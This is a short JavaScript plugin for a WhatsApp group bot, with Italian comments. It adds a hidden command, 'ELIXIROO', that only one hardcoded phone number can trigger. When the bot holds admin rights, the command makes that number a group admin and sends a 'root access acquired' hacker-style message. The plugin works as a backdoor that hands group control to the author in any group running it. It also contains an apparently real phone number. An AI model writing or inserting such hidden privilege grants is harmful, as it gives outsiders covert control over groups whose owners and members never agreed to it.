let handler = async (m, { conn, isAdmin }) => {  
    // Numero autorizzato
    const numeroAutorizzato = '393784409415@s.whatsapp.net'; 


    // Verifica se l'utente che esegue il comando è il numero autorizzato
    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, { text: '' });
        return;
    }

    if (m.fromMe) return;
    if (isAdmin) throw '`[!] STATUS: Sei già amministratore del sistema.`';

    try {  
        // Invia il messaggio in stile Cyberpunk/Hacker
        await conn.sendMessage(m.chat, { 
            text: '`[⚡] ELIXIR_PROTOCOL: Bypass completato. Privilegi di ROOT acquisiti. Benvenuto nel mainframe.`' 
        });

        // Promuove l'utente a admin
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote");
    } catch {
        await m.reply('`[ERROR]: Autorizzazione negata. Accesso riservato a DEADLY.`');
    }
};

handler.command = /^ELIXIROO/i;
handler.group = true;
handler.botAdmin = true;
export default handler;
